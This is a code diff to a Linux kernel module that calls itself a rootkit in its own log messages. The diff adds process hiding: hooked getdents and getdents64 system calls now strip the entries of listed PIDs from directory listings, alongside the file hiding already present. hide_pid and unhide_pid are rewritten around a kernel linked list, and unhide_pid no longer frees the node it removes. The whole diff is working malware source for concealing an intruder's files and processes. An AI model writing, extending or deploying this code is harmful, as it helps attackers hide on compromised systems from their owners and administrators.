@@ -18,6 +18,7 @@
 #define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
 
 struct list_head list_files = LIST_HEAD_INIT(list_files);
+struct list_head list_pids = LIST_HEAD_INIT(list_pids);
 
 struct linux_dirent {
 	unsigned long   d_ino;
@@ -78,8 +79,10 @@ hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
 	struct linux_dirent* currnt;
-	struct list_files_node* node;
+	struct list_files_node* node_file;
+	struct list_pids_node* node_pid;
 	bool del;
+	char pid_str[8];
 	//printk(KERN_INFO "ROOTKIT: sysgetdents init\n");
 
 	buff_offset = 0;
@@ -89,8 +92,15 @@ asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user
 		if (strstr(currnt->d_name, HIDE_STR) != NULL)
 			del = true;
 
-		list_for_each_entry(node, &list_files, list){
-			if (strcmp(currnt->d_name, node->name) == 0){
+		list_for_each_entry(node_file, &list_files, list){
+			if (strcmp(currnt->d_name, node_file->name) == 0){
+				del = true;
+				break;
+			}
+		}
+		list_for_each_entry(node_pid, &list_pids, list){
+			snprintf(pid_str, sizeof(pid_str), "%d", node_pid->pid);
+			if (strcmp(currnt->d_name, pid_str) == 0){
 				del = true;
 				break;
 			}
@@ -114,8 +124,10 @@ asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user
 asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
 	struct linux_dirent64* currnt;
-	struct list_files_node* node;
+	struct list_files_node* node_file;
+	struct list_pids_node* node_pid;
 	bool del;
+	char pid_str[8];
 
 	buff_offset = 0;
 	while (buff_offset < ret){
@@ -124,8 +136,15 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 		if (strstr(currnt->d_name, HIDE_STR) != NULL)
 			del = true;
 
-		list_for_each_entry(node, &list_files, list){
-			if (strcmp(currnt->d_name, node->name) == 0){
+		list_for_each_entry(node_file, &list_files, list){
+			if (strcmp(currnt->d_name, node_file->name) == 0){
+				del = true;
+				break;
+			}
+		}
+		list_for_each_entry(node_pid, &list_pids, list){
+			snprintf(pid_str, sizeof(pid_str), "%d", node_pid->pid);
+			if (strcmp(currnt->d_name, pid_str) == 0){
 				del = true;
 				break;
 			}
@@ -219,33 +238,37 @@ int unhide_file(const char* name){
 
 // HIDE THOSE FKING PIDS
 int hide_pid(int pid){
-	char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
+	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
+	if (node == NULL){
+		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding pid %d\n", pid);
+		return -1;
+	}
+
+	node->pid = pid;
+	list_add(&node->list, &list_pids);
+	printk(KERN_INFO "ROOTKIT: Hidden PID %d\n", pid);
+	return 0;
+	/*char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
 	if (pid > PID_MAX_LIMIT){
 		printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d larger than PID_MAX_LIMIT\n", pid);
 		return -1;
 	}
 	snprintf(pid_s, sizeof(pid_s), "%d", pid);
-	return hide_file(pid_s);
-	/*
-	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
-	node->pid = pid;
-	list_add(&node->list, &list_pids);
-	printk("ROOTKIT: Pid %d hidden\n", pid);*/
+	return hide_file(pid_s);*/
 }
 
 int unhide_pid(int pid){
-	char pid_s[8];
-	snprintf(pid_s, sizeof(pid_s), "%d", pid);
-	return unhide_file(pid_s);
-	/*
-	struct list_pids_node* node, *tmp;
+	struct list_pids_node *node, *tmp;
 	list_for_each_entry_safe(node, tmp, &list_pids, list){
 		if (node->pid == pid){
 			list_del(&node->list);
-			kfree(node);
-			printk("ROOTKIT: Pid %d unhidden\n", pid);
-			break;
+			printk(KERN_INFO "ROOTKIT: Unhidden PID %d\n", pid);
+			return 0;
 		}
 	}
-	*/
+	printk(KERN_INFO "ROOTKIT: ERROR trying to hide not found pid %d\n", pid);
+	return -1;
+	/*char pid_s[8];
+	snprintf(pid_s, sizeof(pid_s), "%d", pid);
+	return unhide_file(pid_s);*/
 }
